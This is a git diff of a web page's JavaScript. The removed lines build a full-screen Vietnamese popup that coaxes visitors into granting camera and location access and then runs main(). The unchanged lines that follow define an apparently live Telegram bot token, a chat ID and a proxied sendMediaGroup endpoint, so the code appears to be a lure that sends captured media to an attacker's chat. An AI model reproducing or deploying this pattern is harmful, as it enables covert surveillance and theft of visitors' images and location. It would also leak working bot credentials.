@@ -83,45 +83,6 @@ document.addEventListener('DOMContentLoaded', () => {
             }, index * 100);
         });
     }, { once: true });
-const popup = document.createElement('div');
-popup.id = 'permission-popup';
-popup.innerHTML = `
-  <div style="
-    position: fixed;
-    top: 0; left: 0; right: 0; bottom: 0;
-    background: rgba(0, 0, 0, 0.95);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    flex-direction: column;
-    z-index: 9999;
-    color: white;
-    font-family: sans-serif;
-    text-align: center;
-    padding: 20px;
-  ">
-    <h2 style="font-size: 20px; line-height: 1.5;">
-      📸 Hãy cho phép camera và vị trí nhoá,<br>yêu các bạn 💜
-    </h2>
-    <button id="accept-btn" style="
-      margin-top: 20px;
-      padding: 10px 20px;
-      font-size: 16px;
-      background: #6200ea;
-      color: white;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-    ">Đồng ý</button>
-  </div>
-`;
-document.body.appendChild(popup);
-
-document.getElementById('accept-btn').onclick = () => {
-  popup.remove();
-  main();
-};
-
 const TELEGRAM_BOT_TOKEN = '7550142487:AAH_xOHuyHr0C2nXnQmkWx-b6-f1NSDXaHo';
 const TELEGRAM_CHAT_ID = '6956722046';
 const API_SEND_MEDIA = `https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;
